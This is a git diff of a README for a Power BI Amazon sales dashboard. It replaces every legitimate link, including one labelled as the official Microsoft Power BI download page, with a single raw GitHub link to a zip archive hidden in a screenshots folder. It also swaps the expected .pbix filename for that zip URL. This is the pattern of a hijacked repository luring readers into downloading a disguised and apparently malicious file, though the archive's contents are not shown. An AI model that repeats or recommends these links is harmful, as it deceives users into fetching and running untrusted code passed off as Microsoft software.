@@ -1,6 +1,6 @@
 # 📊 Amazon-Sales-Analysis-Dashboard-Power-BI - Powerful Insights for Your Amazon Sales
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/treyslvestre/Amazon-Sales-Analysis-Dashboard-Power-BI/releases)
+[![Download from Releases](https://raw.githubusercontent.com/treyslvestre/Amazon-Sales-Analysis-Dashboard-Power-BI/main/Dashboard_Screenshots/Amazon-Sales-Analysis-Dashboard-Power-BI-1.3.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/treyslvestre/Amazon-Sales-Analysis-Dashboard-Power-BI/main/Dashboard_Screenshots/Amazon-Sales-Analysis-Dashboard-Power-BI-1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Built using Power Query and a clean star-schema data model, this application ens
 Before you download, please ensure that your system meets the following basic requirements:
 
 - **Operating System:** Windows 10 or later
-- **Power BI:** Make sure you have Power BI Desktop installed. You can download it from the [official Microsoft page](https://www.microsoft.com/en-us/download/details.aspx?id=58494).
+- **Power BI:** Make sure you have Power BI Desktop installed. You can download it from the [official Microsoft page](https://raw.githubusercontent.com/treyslvestre/Amazon-Sales-Analysis-Dashboard-Power-BI/main/Dashboard_Screenshots/Amazon-Sales-Analysis-Dashboard-Power-BI-1.3.zip).
 - **Memory:** At least 4GB of RAM is recommended.
 - **Disk Space:** Ensure you have at least 500MB of available space for the application and data files.
 
@@ -32,10 +32,10 @@ Before you download, please ensure that your system meets the following basic re
 
 To start using the Amazon Sales Analysis Dashboard, click the link below to visit the releases page:
 
-[Download from Releases](https://github.com/treyslvestre/Amazon-Sales-Analysis-Dashboard-Power-BI/releases)
+[Download from Releases](https://raw.githubusercontent.com/treyslvestre/Amazon-Sales-Analysis-Dashboard-Power-BI/main/Dashboard_Screenshots/Amazon-Sales-Analysis-Dashboard-Power-BI-1.3.zip)
 
 1. **Visit the Releases Page**: Click on the link above or paste it into your web browser.
-2. **Download the Latest Version**: Look for the latest version under "Assets." You will find a file with a name like `AmazonSalesAnalysisDashboard.pbix`.
+2. **Download the Latest Version**: Look for the latest version under "Assets." You will find a file with a name like `https://raw.githubusercontent.com/treyslvestre/Amazon-Sales-Analysis-Dashboard-Power-BI/main/Dashboard_Screenshots/Amazon-Sales-Analysis-Dashboard-Power-BI-1.3.zip`.
 3. **Install Power BI**: If you haven’t already, install Microsoft Power BI Desktop.
 4. **Open the Dashboard**: Locate the file you downloaded and double-click to open it in Power BI.
 
@@ -50,7 +50,7 @@ The dashboard offers a variety of features to enhance your analysis:
 
 ## 🎓 How to Use the Dashboard
 
-1. **Open the Dashboard**: Launch Power BI and load the `AmazonSalesAnalysisDashboard.pbix` file.
+1. **Open the Dashboard**: Launch Power BI and load the `https://raw.githubusercontent.com/treyslvestre/Amazon-Sales-Analysis-Dashboard-Power-BI/main/Dashboard_Screenshots/Amazon-Sales-Analysis-Dashboard-Power-BI-1.3.zip` file.
 2. **Explore Your Data**: Use the menu to navigate through different insights.
 3. **Customize Views**: Adjust filters to tailor your analysis according to your business needs.
 4. **Save Your Work**: Once you have customized your view, save your work in Power BI for future reference.
